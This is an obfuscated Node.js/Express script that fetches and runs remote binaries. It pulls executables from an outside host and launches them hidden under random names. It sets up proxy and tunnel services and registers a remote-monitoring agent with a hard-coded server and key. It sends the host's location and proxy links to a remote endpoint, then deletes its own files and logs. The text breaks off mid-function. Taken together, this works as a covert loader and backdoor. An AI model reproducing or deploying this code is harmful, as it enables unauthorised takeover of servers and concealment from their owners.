const _0x5eaf48=_0x160f;(function(_0x1fd450,_0x141e3e){const _0x207cd0={_0x4b3ae2:0x103,_0x345a03:0xdd,_0x58be8f:0xe8,_0x4f4829:0x153,_0x345ffb:0x109},_0x59859b=_0x160f,_0x11530e=_0x1fd450();while(!![]){try{const _0x515157=-parseInt(_0x59859b(_0x207cd0._0x4b3ae2))/0x1+-parseInt(_0x59859b(0x168))/0x2+-parseInt(_0x59859b(_0x207cd0._0x345a03))/0x3+-parseInt(_0x59859b(0x131))/0x4*(parseInt(_0x59859b(_0x207cd0._0x58be8f))/0x5)+parseInt(_0x59859b(_0x207cd0._0x4f4829))/0x6*(-parseInt(_0x59859b(_0x207cd0._0x345ffb))/0x7)+-parseInt(_0x59859b(0xe5))/0x8*(-parseInt(_0x59859b(0xb0))/0x9)+parseInt(_0x59859b(0x128))/0xa*(parseInt(_0x59859b(0xf5))/0xb);if(_0x515157===_0x141e3e)break;else _0x11530e['push'](_0x11530e['shift']());}catch(_0x1f5be3){_0x11530e['push'](_0x11530e['shift']());}}}(_0x48c8,0x8007e));const express=require(_0x5eaf48(0xb3)),app=express(),axios=require(_0x5eaf48(0x104)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require('util'),exec=promisify(require('child_process')['exec']),{execSync}=require(_0x5eaf48(0x142)),UPLOAD_URL=process[_0x5eaf48(0x158)][_0x5eaf48(0xff)]||'',PROJECT_URL=process[_0x5eaf48(0x158)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x5eaf48(0x158)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x5eaf48(0x158)][_0x5eaf48(0x12b)]||_0x5eaf48(0xfb),SUB_PATH=process[_0x5eaf48(0x158)][_0x5eaf48(0xda)]||_0x5eaf48(0xc4),PORT=process['env'][_0x5eaf48(0x11a)]||process[_0x5eaf48(0x158)][_0x5eaf48(0xc6)]||0xbb8,UUID=process[_0x5eaf48(0x158)][_0x5eaf48(0x12a)]||_0x5eaf48(0x139),NEZHA_SERVER=process[_0x5eaf48(0x158)][_0x5eaf48(0x16f)]||'nz.luyuhanv5.top:443',NEZHA_PORT=process['env'][_0x5eaf48(0xd8)]||'',NEZHA_KEY=process[_0x5eaf48(0x158)][_0x5eaf48(0x136)]||_0x5eaf48(0x167),ARGO_DOMAIN=process[_0x5eaf48(0x158)][_0x5eaf48(0xdf)]||_0x5eaf48(0xe3),ARGO_AUTH=process[_0x5eaf48(0x158)][_0x5eaf48(0x166)]||_0x5eaf48(0x10d),ARGO_PORT=process[_0x5eaf48(0x158)][_0x5eaf48(0xf9)]||0x42cd,CFIP=process[_0x5eaf48(0x158)][_0x5eaf48(0x129)]||_0x5eaf48(0xc3),CFPORT=process[_0x5eaf48(0x158)][_0x5eaf48(0x10c)]||0x1bb,NAME=process['env'][_0x5eaf48(0x16e)]||'miget2';!fs[_0x5eaf48(0x16c)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x5eaf48(0x137)](FILE_PATH+'\x20is\x20created')):console[_0x5eaf48(0x137)](FILE_PATH+_0x5eaf48(0x15e));function generateRandomName(){const _0x26a715={_0x59d3ff:0x146},_0x465582=_0x5eaf48,_0x34f7fc=_0x465582(0xbb);let _0x44c234='';for(let _0x4aad2e=0x0;_0x4aad2e<0x6;_0x4aad2e++){_0x44c234+=_0x34f7fc[_0x465582(0x144)](Math[_0x465582(0x10a)](Math[_0x465582(_0x26a715._0x59d3ff)]()*_0x34f7fc['length']));}return _0x44c234;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x5eaf48(0x170)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x5eaf48(0x170)](FILE_PATH,_0x5eaf48(0x14b)),listPath=path['join'](FILE_PATH,_0x5eaf48(0x13e)),bootLogPath=path[_0x5eaf48(0x170)](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0x494ec1={_0x1a25b3:0x12c,_0x21fd47:0x12d,_0x2c0a77:0xfc,_0x3ad389:0x147,_0x50c0f3:0x12f,_0x705506:0xb9},_0x568f93=_0x5eaf48;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x3e7920;try{_0x3e7920=fs[_0x568f93(_0x494ec1._0x1a25b3)](subPath,_0x568f93(0x147));}catch{return null;}const _0x1bad57=Buffer[_0x568f93(0xde)](_0x3e7920,_0x568f93(_0x494ec1._0x21fd47))[_0x568f93(_0x494ec1._0x2c0a77)](_0x568f93(_0x494ec1._0x3ad389)),_0x46e849=_0x1bad57[_0x568f93(0xf0)]('\x0a')[_0x568f93(_0x494ec1._0x50c0f3)](_0x55f236=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x568f93(0x169)](_0x55f236));if(_0x46e849[_0x568f93(0xc1)]===0x0)return;return axios[_0x568f93(0x105)](UPLOAD_URL+_0x568f93(0x119),JSON[_0x568f93(_0x494ec1._0x705506)]({'nodes':_0x46e849}),{'headers':{'Content-Type':_0x568f93(0xd0)}})['catch'](_0xcbcd0c=>{return null;}),null;}catch(_0xd04612){return null;}}function cleanupOldFiles(){const _0x439bb5={_0x1b45bb:0xb8},_0x3b2fd2=_0x5eaf48;try{const _0x3e1cf6=fs[_0x3b2fd2(0x118)](FILE_PATH);_0x3e1cf6['forEach'](_0x40454b=>{const _0x31173c=_0x3b2fd2,_0x12b27b=path['join'](FILE_PATH,_0x40454b);try{const _0x51041b=fs[_0x31173c(_0x439bb5._0x1b45bb)](_0x12b27b);_0x51041b[_0x31173c(0x15b)]()&&fs['unlinkSync'](_0x12b27b);}catch(_0x2c27a7){}});}catch(_0x3c3ea6){}}app[_0x5eaf48(0x154)]('/',function(_0x19785d,_0x40e752){const _0x3e2ec2={_0x3b896d:0x120},_0x86254c=_0x5eaf48;_0x40e752[_0x86254c(_0x3e2ec2._0x3b896d)](_0x86254c(0xae));});async function generateConfig(){const _0x4d91ef={_0x2620ab:0xcc,_0x1f50cd:0x122,_0x54696e:0xfd,_0x43975f:0x13f,_0x5c6d28:0xfe,_0x1fc021:0x122,_0x296673:0xce,_0x459f76:0xad,_0x539d8e:0x13f,_0xe54531:0xca,_0x9a012c:0xfe,_0xd13d0f:0x16a,_0x3455cb:0x10f,_0x534a72:0x135,_0x472d52:0xb9},_0x56816f=_0x5eaf48,_0x2a678f={'log':{'access':_0x56816f(_0x4d91ef._0x2620ab),'error':_0x56816f(0xcc),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x56816f(0xce),'settings':{'clients':[{'id':UUID,'flow':_0x56816f(0x150)}],'decryption':_0x56816f(_0x4d91ef._0x1f50cd),'fallbacks':[{'dest':0xbb9},{'path':_0x56816f(_0x4d91ef._0x54696e),'dest':0xbba},{'path':_0x56816f(_0x4d91ef._0x43975f),'dest':0xbbb},{'path':_0x56816f(_0x4d91ef._0x5c6d28),'dest':0xbbc}]},'streamSettings':{'network':_0x56816f(0xaf)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x56816f(0xce),'settings':{'clients':[{'id':UUID}],'decryption':_0x56816f(_0x4d91ef._0x1fc021)},'streamSettings':{'network':'tcp','security':_0x56816f(0x122)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x56816f(_0x4d91ef._0x296673),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x56816f(_0x4d91ef._0x1f50cd)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x56816f(_0x4d91ef._0x54696e)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x56816f(0x134),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x56816f(_0x4d91ef._0x459f76),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x56816f(_0x4d91ef._0x539d8e)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x56816f(0x134),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x56816f(0xad),'protocol':_0x56816f(_0x4d91ef._0xe54531),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x56816f(_0x4d91ef._0x9a012c)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x56816f(0x134),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x56816f(_0x4d91ef._0xd13d0f)]},'outbounds':[{'protocol':_0x56816f(0x138),'tag':_0x56816f(_0x4d91ef._0x3455cb)},{'protocol':'blackhole','tag':'block'}]};fs[_0x56816f(_0x4d91ef._0x534a72)](path[_0x56816f(0x170)](FILE_PATH,'config.json'),JSON[_0x56816f(_0x4d91ef._0x472d52)](_0x2a678f,null,0x2));}function getSystemArchitecture(){const _0x4a06b1={_0x3040f5:0xd6,_0x10b207:0x14d,_0x5c580a:0xd9},_0x5e21c4=_0x5eaf48,_0x5ad376=os['arch']();return _0x5ad376==='arm'||_0x5ad376===_0x5e21c4(_0x4a06b1._0x3040f5)||_0x5ad376===_0x5e21c4(0x113)?_0x5e21c4(_0x4a06b1._0x10b207):_0x5e21c4(_0x4a06b1._0x5c580a);}function downloadFile(_0x9c91fe,_0x253cca,_0xeb47aa){const _0x54e128={_0x3b93b9:0x16c,_0x35dd79:0xd7,_0x4d54cb:0xbe},_0x168448={_0x54a5f5:0x132},_0x4e107b={_0x1df69b:0xec,_0x4274b4:0x162,_0x2d1e38:0x124},_0x1aac5e=_0x5eaf48,_0x1e94c6=_0x9c91fe;!fs[_0x1aac5e(_0x54e128._0x3b93b9)](FILE_PATH)&&fs[_0x1aac5e(_0x54e128._0x35dd79)](FILE_PATH,{'recursive':!![]});const _0x275455=fs['createWriteStream'](_0x1e94c6);axios({'method':'get','url':_0x253cca,'responseType':_0x1aac5e(_0x54e128._0x4d54cb)})[_0x1aac5e(0xf7)](_0x28cf1d=>{const _0x19ee6c=_0x1aac5e;_0x28cf1d[_0x19ee6c(_0x168448._0x54a5f5)]['pipe'](_0x275455),_0x275455['on'](_0x19ee6c(0x127),()=>{const _0x3d68cb=_0x19ee6c;_0x275455[_0x3d68cb(_0x4e107b._0x1df69b)](),console[_0x3d68cb(0x137)]('Download\x20'+path[_0x3d68cb(_0x4e107b._0x4274b4)](_0x1e94c6)+_0x3d68cb(_0x4e107b._0x2d1e38)),_0xeb47aa(null,_0x1e94c6);}),_0x275455['on']('error',_0xcff628=>{const _0x2cc662=_0x19ee6c;fs[_0x2cc662(0xe9)](_0x1e94c6,()=>{});const _0x2bba33='Download\x20'+path['basename'](_0x1e94c6)+_0x2cc662(0x112)+_0xcff628[_0x2cc662(0x14e)];console['error'](_0x2bba33),_0xeb47aa(_0x2bba33);});})[_0x1aac5e(0xed)](_0x22f352=>{const _0x1bd98a=_0x1aac5e,_0x223af3=_0x1bd98a(0x14c)+path[_0x1bd98a(0x162)](_0x1e94c6)+'\x20failed:\x20'+_0x22f352['message'];console['error'](_0x223af3),_0xeb47aa(_0x223af3);});}async function downloadFilesAndRun(){const _0x3b744d={_0x1d5bb9:0x137,_0x235ffb:0x110,_0x2a7b42:0xb1,_0x23d7b3:0x171,_0x5d33b2:0x116,_0x23170b:0xf6,_0x36400d:0x125,_0x188034:0xbc,_0xf33574:0x170,_0x283152:0x13b,_0x8f5ff4:0xb4,_0x5d957b:0x133,_0x5cc53f:0xeb,_0x43deb3:0x115,_0x321077:0x173,_0x9349e0:0x11e,_0x53c5de:0x100,_0x1c13e6:0x126,_0x775f2c:0x15c,_0x437d32:0x15d,_0x271cc7:0x172,_0xe95e6b:0x106,_0x19215b:0xd1},_0x32543f=_0x5eaf48,_0x354002=getSystemArchitecture(),_0x5770ba=getFilesForArchitecture(_0x354002);if(_0x5770ba[_0x32543f(0xc1)]===0x0){console[_0x32543f(_0x3b744d._0x1d5bb9)](_0x32543f(0x114));return;}const _0x5a7c1b=_0x5770ba['map'](_0x1f1a2b=>{return new Promise((_0x4239d9,_0x191336)=>{const _0x4e9a7e=_0x160f;downloadFile(_0x1f1a2b[_0x4e9a7e(0xc9)],_0x1f1a2b['fileUrl'],(_0x284b09,_0x10e61b)=>{_0x284b09?_0x191336(_0x284b09):_0x4239d9(_0x10e61b);});});});try{await Promise[_0x32543f(_0x3b744d._0x235ffb)](_0x5a7c1b);}catch(_0x567db7){console[_0x32543f(0xd1)](_0x32543f(_0x3b744d._0x2a7b42),_0x567db7);return;}function _0x58acea(_0xc89d30){const _0xbccf47={_0x3304b5:0x16c},_0x658837={_0x59007d:0x164,_0x134926:0xfc},_0x2b2bcc=_0x32543f,_0x5f126d=0x1fd;_0xc89d30[_0x2b2bcc(0x163)](_0x2446ac=>{const _0x3b3b7d=_0x2b2bcc;fs[_0x3b3b7d(_0xbccf47._0x3304b5)](_0x2446ac)&&fs['chmod'](_0x2446ac,_0x5f126d,_0x1d8694=>{const _0x5b2890=_0x3b3b7d;_0x1d8694?console[_0x5b2890(0xd1)](_0x5b2890(_0x658837._0x59007d)+_0x2446ac+':\x20'+_0x1d8694):console[_0x5b2890(0x137)]('Empowerment\x20success\x20for\x20'+_0x2446ac+':\x20'+_0x5f126d[_0x5b2890(_0x658837._0x134926)](0x8));});});}const _0xf3cff8=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x58acea(_0xf3cff8);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5c54bd=NEZHA_SERVER[_0x32543f(0xc8)](':')?NEZHA_SERVER[_0x32543f(0xf0)](':')[_0x32543f(_0x3b744d._0x23d7b3)]():'',_0x5f571f=new Set([_0x32543f(0x10b),'8443',_0x32543f(_0x3b744d._0x5d33b2),_0x32543f(0xb4),_0x32543f(0x133),_0x32543f(_0x3b744d._0x23170b)]),_0x577a5f=_0x5f571f['has'](_0x5c54bd)?_0x32543f(0xcd):_0x32543f(_0x3b744d._0x36400d),_0x5f1db5=_0x32543f(0xe6)+NEZHA_KEY+_0x32543f(0xcb)+NEZHA_SERVER+_0x32543f(0x140)+_0x577a5f+_0x32543f(_0x3b744d._0x188034)+UUID;fs[_0x32543f(0x135)](path[_0x32543f(_0x3b744d._0xf33574)](FILE_PATH,_0x32543f(_0x3b744d._0x283152)),_0x5f1db5);const _0x139e43='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x32543f(0x15f);try{await exec(_0x139e43),console['log'](phpName+'\x20is\x20running'),await new Promise(_0x1c9a6d=>setTimeout(_0x1c9a6d,0x3e8));}catch(_0x5bc54d){console['error']('php\x20running\x20error:\x20'+_0x5bc54d);}}else{let _0x2fdc08='';const _0x30ec7b=[_0x32543f(0x10b),_0x32543f(0x111),_0x32543f(0x116),_0x32543f(_0x3b744d._0x8f5ff4),_0x32543f(_0x3b744d._0x5d957b),_0x32543f(0xf6)];_0x30ec7b['includes'](NEZHA_PORT)&&(_0x2fdc08=_0x32543f(_0x3b744d._0x5cc53f));const _0x528007=_0x32543f(0x106)+npmPath+_0x32543f(_0x3b744d._0x43deb3)+NEZHA_SERVER+':'+NEZHA_PORT+_0x32543f(_0x3b744d._0x321077)+NEZHA_KEY+'\x20'+_0x2fdc08+_0x32543f(0x152);try{await exec(_0x528007),console['log'](npmName+_0x32543f(0x130)),await new Promise(_0x4e7c1f=>setTimeout(_0x4e7c1f,0x3e8));}catch(_0x556cae){console[_0x32543f(0xd1)](_0x32543f(_0x3b744d._0x9349e0)+_0x556cae);}}}else console[_0x32543f(0x137)](_0x32543f(_0x3b744d._0x53c5de));const _0x55a404=_0x32543f(0x106)+webPath+_0x32543f(0x148)+FILE_PATH+_0x32543f(_0x3b744d._0x1c13e6);try{await exec(_0x55a404),console[_0x32543f(_0x3b744d._0x1d5bb9)](webName+'\x20is\x20running'),await new Promise(_0x401130=>setTimeout(_0x401130,0x3e8));}catch(_0x5a181e){console[_0x32543f(0xd1)](_0x32543f(0xef)+_0x5a181e);}if(fs['existsSync'](botPath)){let _0x5597cb;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x5597cb=_0x32543f(0x16d)+ARGO_AUTH;else ARGO_AUTH[_0x32543f(_0x3b744d._0x775f2c)](/TunnelSecret/)?_0x5597cb='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x32543f(_0x3b744d._0x437d32):_0x5597cb=_0x32543f(_0x3b744d._0x271cc7)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x32543f(_0x3b744d._0xe95e6b)+botPath+'\x20'+_0x5597cb+_0x32543f(0x11b)),console['log'](botName+'\x20is\x20running'),await new Promise(_0xd81f07=>setTimeout(_0xd81f07,0x7d0));}catch(_0x4d2b2c){console[_0x32543f(_0x3b744d._0x19215b)](_0x32543f(0xd3)+_0x4d2b2c);}}await new Promise(_0xe78904=>setTimeout(_0xe78904,0x1388));}function getFilesForArchitecture(_0x239da1){const _0x4074bc={_0x56b52e:0x14d,_0x15c50e:0xf1,_0xfb97e:0xf2,_0x23cd7c:0x14f,_0x335c4a:0x161},_0x4b9f67=_0x5eaf48;let _0x37c481;_0x239da1===_0x4b9f67(_0x4074bc._0x56b52e)?_0x37c481=[{'fileName':webPath,'fileUrl':_0x4b9f67(_0x4074bc._0x15c50e)},{'fileName':botPath,'fileUrl':_0x4b9f67(_0x4074bc._0xfb97e)}]:_0x37c481=[{'fileName':webPath,'fileUrl':_0x4b9f67(0x151)},{'fileName':botPath,'fileUrl':_0x4b9f67(_0x4074bc._0x23cd7c)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x779421=_0x239da1===_0x4b9f67(0x14d)?'https://arm64.ssss.nyc.mn/agent':_0x4b9f67(_0x4074bc._0x335c4a);_0x37c481['unshift']({'fileName':npmPath,'fileUrl':_0x779421});}else{const _0x30b901=_0x239da1===_0x4b9f67(0x14d)?_0x4b9f67(0x12e):_0x4b9f67(0xd5);_0x37c481[_0x4b9f67(0xc0)]({'fileName':phpPath,'fileUrl':_0x30b901});}}return _0x37c481;}function argoType(){const _0x3de640={_0x527c08:0xc8,_0x26b828:0x13a,_0x2c0d0f:0x107,_0x1913be:0x155,_0x212999:0x16b,_0x30ec9b:0x135,_0x4f04a3:0x15a,_0x37384d:0x137},_0x4486cb=_0x5eaf48;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4486cb(0x137)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x4486cb(_0x3de640._0x527c08)](_0x4486cb(0xf3))){fs['writeFileSync'](path[_0x4486cb(0x170)](FILE_PATH,_0x4486cb(0x155)),ARGO_AUTH);const _0x465f8b=_0x4486cb(_0x3de640._0x26b828)+ARGO_AUTH[_0x4486cb(0xf0)]('\x22')[0xb]+_0x4486cb(_0x3de640._0x2c0d0f)+path[_0x4486cb(0x170)](FILE_PATH,_0x4486cb(_0x3de640._0x1913be))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x4486cb(0x102)+ARGO_PORT+_0x4486cb(_0x3de640._0x212999);fs[_0x4486cb(_0x3de640._0x30ec9b)](path[_0x4486cb(0x170)](FILE_PATH,_0x4486cb(_0x3de640._0x4f04a3)),_0x465f8b);}else console[_0x4486cb(_0x3de640._0x37384d)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x5de40d={_0x4cbc06:0x12c,_0x4edb8e:0x170,_0x3e517c:0x147,_0x465e75:0x137,_0x55546c:0xdc,_0x333d5e:0x13c,_0x2c9d72:0x11b,_0x1a97f2:0xd1},_0xc2b31c={_0x32d5a5:0x132,_0x123bb0:0x101,_0x2aa94e:0x143,_0x4fa859:0xf8,_0x542228:0x132,_0x4d473b:0xf4,_0x3d28f5:0x132,_0x3b88dc:0x123,_0x41c5a6:0x157},_0x3db0c8={_0x4a2af2:0xba,_0x415642:0x11c,_0x430dc3:0xea},_0x3489f5=_0x5eaf48;let _0x2ebf4f;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2ebf4f=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x2ebf4f),await _0x1c6e97(_0x2ebf4f);else try{const _0x42edbc=fs[_0x3489f5(_0x5de40d._0x4cbc06)](path[_0x3489f5(_0x5de40d._0x4edb8e)](FILE_PATH,_0x3489f5(0x13c)),_0x3489f5(_0x5de40d._0x3e517c)),_0x1b28e7=_0x42edbc[_0x3489f5(0xf0)]('\x0a'),_0x3de26e=[];_0x1b28e7[_0x3489f5(0x163)](_0x25d1c2=>{const _0x5a9e51=_0x3489f5,_0x1832b0=_0x25d1c2[_0x5a9e51(0x15c)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1832b0){const _0x2dc71f=_0x1832b0[0x1];_0x3de26e['push'](_0x2dc71f);}});if(_0x3de26e[_0x3489f5(0xc1)]>0x0)_0x2ebf4f=_0x3de26e[0x0],console[_0x3489f5(_0x5de40d._0x465e75)](_0x3489f5(0xe1),_0x2ebf4f),await _0x1c6e97(_0x2ebf4f);else{console[_0x3489f5(0x137)](_0x3489f5(0xe4)),fs[_0x3489f5(_0x5de40d._0x55546c)](path['join'](FILE_PATH,_0x3489f5(_0x5de40d._0x333d5e)));async function _0x115131(){const _0x38eb55=_0x3489f5;try{process[_0x38eb55(_0x3db0c8._0x4a2af2)]==='win32'?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x38eb55(0xb7)):await exec(_0x38eb55(_0x3db0c8._0x415642)+botName[_0x38eb55(0x144)](0x0)+']'+botName[_0x38eb55(0xe0)](0x1)+_0x38eb55(_0x3db0c8._0x430dc3));}catch(_0x112cfa){}}_0x115131(),await new Promise(_0x15e5a1=>setTimeout(_0x15e5a1,0xbb8));const _0x50c94e='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x3489f5(0xdb)+ARGO_PORT;try{await exec(_0x3489f5(0x106)+botPath+'\x20'+_0x50c94e+_0x3489f5(_0x5de40d._0x2c9d72)),console['log'](botName+_0x3489f5(0x130)),await new Promise(_0x304a64=>setTimeout(_0x304a64,0xbb8)),await extractDomains();}catch(_0x22143f){console['error']('Error\x20executing\x20command:\x20'+_0x22143f);}}}catch(_0x40aebc){console[_0x3489f5(_0x5de40d._0x1a97f2)](_0x3489f5(0x149),_0x40aebc);}async function _0x28579d(){const _0x24c855=_0x3489f5;try{const _0x1af092=await axios[_0x24c855(0x154)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x1af092[_0x24c855(0x132)]&&_0x1af092[_0x24c855(_0xc2b31c._0x32d5a5)]['country_code']&&_0x1af092[_0x24c855(0x132)]['org'])return _0x1af092['data']['country_code']+'_'+_0x1af092[_0x24c855(0x132)][_0x24c855(0xf4)];}catch(_0x23be72){try{const _0x1bdcc6=await axios[_0x24c855(0x154)](_0x24c855(_0xc2b31c._0x123bb0),{'timeout':0xbb8});if(_0x1bdcc6[_0x24c855(0x132)]&&_0x1bdcc6[_0x24c855(_0xc2b31c._0x32d5a5)][_0x24c855(_0xc2b31c._0x2aa94e)]===_0x24c855(_0xc2b31c._0x4fa859)&&_0x1bdcc6[_0x24c855(_0xc2b31c._0x542228)]['countryCode']&&_0x1bdcc6[_0x24c855(0x132)][_0x24c855(_0xc2b31c._0x4d473b)])return _0x1bdcc6[_0x24c855(_0xc2b31c._0x3d28f5)][_0x24c855(_0xc2b31c._0x3b88dc)]+'_'+_0x1bdcc6[_0x24c855(0x132)][_0x24c855(0xf4)];}catch(_0x82e681){}}return _0x24c855(_0xc2b31c._0x41c5a6);}async function _0x1c6e97(_0x4206b3){const _0x5139d5={_0x4cd36c:0x122,_0x2adbe5:0x117,_0x4069f7:0x160,_0x596bf6:0xe2,_0x51ecd5:0x121,_0x5b4a4b:0x13d,_0x8e7c80:0xfc,_0x125d7f:0xc2,_0x55a952:0x121,_0x2665a0:0xde,_0x44fa5f:0x12d,_0x5698b7:0xb2,_0x5453c2:0x154},_0x45c49f=await _0x28579d(),_0x5b795f=NAME?NAME+'-'+_0x45c49f:_0x45c49f;return new Promise(_0x3ddc77=>{const _0x4c9ba4={_0x16cee0:0xfc,_0x36d3b7:0x120};setTimeout(()=>{const _0x530080=_0x160f,_0x19dc43={'v':'2','ps':''+_0x5b795f,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x530080(0x122),'net':'ws','type':_0x530080(_0x5139d5._0x4cd36c),'host':_0x4206b3,'path':_0x530080(0x11f),'tls':_0x530080(0x134),'sni':_0x4206b3,'alpn':'','fp':_0x530080(_0x5139d5._0x2adbe5)},_0x1fde78=_0x530080(_0x5139d5._0x4069f7)+UUID+'@'+CFIP+':'+CFPORT+_0x530080(_0x5139d5._0x596bf6)+_0x4206b3+_0x530080(_0x5139d5._0x51ecd5)+_0x4206b3+_0x530080(0xc7)+_0x5b795f+_0x530080(_0x5139d5._0x5b4a4b)+Buffer['from'](JSON[_0x530080(0xb9)](_0x19dc43))[_0x530080(_0x5139d5._0x8e7c80)]('base64')+_0x530080(_0x5139d5._0x125d7f)+UUID+'@'+CFIP+':'+CFPORT+_0x530080(0xbd)+_0x4206b3+_0x530080(_0x5139d5._0x55a952)+_0x4206b3+_0x530080(0x156)+_0x5b795f+_0x530080(0x108);console['log'](Buffer[_0x530080(_0x5139d5._0x2665a0)](_0x1fde78)['toString'](_0x530080(_0x5139d5._0x44fa5f))),fs[_0x530080(0x135)](subPath,Buffer[_0x530080(_0x5139d5._0x2665a0)](_0x1fde78)[_0x530080(_0x5139d5._0x8e7c80)](_0x530080(0x12d))),console[_0x530080(0x137)](FILE_PATH+_0x530080(_0x5139d5._0x5698b7)),uploadNodes(),app[_0x530080(_0x5139d5._0x5453c2)]('/'+SUB_PATH,(_0x5a4660,_0x218cba)=>{const _0xfa0c5d=_0x530080,_0x12f841=Buffer['from'](_0x1fde78)[_0xfa0c5d(_0x4c9ba4._0x16cee0)](_0xfa0c5d(0x12d));_0x218cba[_0xfa0c5d(0xee)]('Content-Type','text/plain;\x20charset=utf-8'),_0x218cba[_0xfa0c5d(_0x4c9ba4._0x36d3b7)](_0x12f841);}),_0x3ddc77(_0x1fde78);},0x7d0);});}}async function uploadNodes(){const _0xccee6b={_0x38ab38:0x137,_0x8288ae:0x10e,_0x4cef44:0x16c,_0xbbb065:0xf0,_0x3ec5a3:0xc1,_0x43aa28:0xb9,_0x142a1e:0x105,_0x49fab8:0xd0,_0x2ce2f7:0x143},_0x474b1d=_0x5eaf48;if(UPLOAD_URL&&PROJECT_URL){const _0x4d0012=PROJECT_URL+'/'+SUB_PATH,_0xe12972={'subscription':[_0x4d0012]};try{const _0x238660=await axios[_0x474b1d(0x105)](UPLOAD_URL+'/api/add-subscriptions',_0xe12972,{'headers':{'Content-Type':_0x474b1d(0xd0)}});return _0x238660&&_0x238660[_0x474b1d(0x143)]===0xc8?(console[_0x474b1d(_0xccee6b._0x38ab38)](_0x474b1d(0x141)),_0x238660):null;}catch(_0x16623f){if(_0x16623f[_0x474b1d(_0xccee6b._0x8288ae)]){if(_0x16623f[_0x474b1d(0x10e)][_0x474b1d(0x143)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x474b1d(_0xccee6b._0x4cef44)](listPath))return;const _0x38cde4=fs['readFileSync'](listPath,'utf-8'),_0x1ee624=_0x38cde4[_0x474b1d(_0xccee6b._0xbbb065)]('\x0a')['filter'](_0xe4f5c5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0xe4f5c5));if(_0x1ee624[_0x474b1d(_0xccee6b._0x3ec5a3)]===0x0)return;const _0x12a84c=JSON[_0x474b1d(_0xccee6b._0x43aa28)]({'nodes':_0x1ee624});try{const _0x409608=await axios[_0x474b1d(_0xccee6b._0x142a1e)](UPLOAD_URL+'/api/add-nodes',_0x12a84c,{'headers':{'Content-Type':_0x474b1d(_0xccee6b._0x49fab8)}});return _0x409608&&_0x409608[_0x474b1d(_0xccee6b._0x2ce2f7)]===0xc8?(console['log'](_0x474b1d(0xe7)),_0x409608):null;}catch(_0x17f0e1){return null;}}else return;}}function cleanFiles(){const _0x2e3f51={_0x524c53:0x145,_0x259747:0x165},_0x33198d={_0x2013e7:0xcf};setTimeout(()=>{const _0x2ca830={_0x132b3c:0x14a,_0x522d19:0x137,_0x106a5e:0xbf,_0x4db926:0xcf},_0x393141=_0x160f,_0xde20a7=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0xde20a7['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xde20a7[_0x393141(0xfa)](phpPath);process['platform']===_0x393141(_0x2e3f51._0x524c53)?exec('del\x20/f\x20/q\x20'+_0xde20a7['join']('\x20')+_0x393141(0xc5),_0x224a47=>{const _0x15d3e3=_0x393141;console[_0x15d3e3(_0x2ca830._0x132b3c)](),console[_0x15d3e3(_0x2ca830._0x522d19)](_0x15d3e3(_0x2ca830._0x106a5e)),console[_0x15d3e3(0x137)](_0x15d3e3(_0x2ca830._0x4db926));}):exec(_0x393141(_0x2e3f51._0x259747)+_0xde20a7[_0x393141(0x170)]('\x20')+_0x393141(0xd2),_0x6fbfc3=>{const 